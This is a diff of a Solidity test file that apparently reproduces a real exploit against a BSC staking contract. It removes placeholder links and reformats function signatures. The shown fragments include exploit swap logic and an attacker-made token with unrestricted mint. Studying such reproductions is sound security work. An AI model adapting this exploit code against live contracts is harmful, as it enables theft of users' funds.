@@ -16,10 +16,8 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0x274b3e185c9c8f4ddef79cb9a8dc0d94f73a7675#code
 
 // @Analysis
-// Post-mortem : https://www.google.com/
 // Twitter Guy : https://twitter.com/AnciliaInc/status/1656337400329834496
 // Twitter Guy : https://twitter.com/AnciliaInc/status/1656341587054702598
-// Hacking God : https://www.google.com/
 
 interface IStakingRewards {
     function addLiquidity(address _token, address token1, uint256 amount1) external;
@@ -130,7 +128,9 @@ contract ContractTest is Test {
         }
     }
 
-    function process(uint256 amount) internal {
+    function process(
+        uint256 amount
+    ) internal {
         uint256 SellQILPAmount = SellQILP.balanceOf(address(customLP));
         address[] memory path = new address[](2);
         path[0] = address(this);
@@ -173,7 +173,9 @@ contract ContractTest is Test {
         return true;
     }
 
-    function mint(uint256 amount) external {
+    function mint(
+        uint256 amount
+    ) external {
         balanceOf[msg.sender] += amount;
         // totalSupply += amount;
     }
@@ -215,13 +217,17 @@ contract SHITCOIN {
         return true;
     }
 
-    function mint(uint256 amount) external {
+    function mint(
+        uint256 amount
+    ) external {
         balanceOf[msg.sender] += amount;
         totalSupply += amount;
         emit Transfer(address(0), msg.sender, amount);
     }
 
-    function burn(uint256 amount) external {
+    function burn(
+        uint256 amount
+    ) external {
         balanceOf[msg.sender] -= amount;
         totalSupply -= amount;
         emit Transfer(msg.sender, address(0), amount);
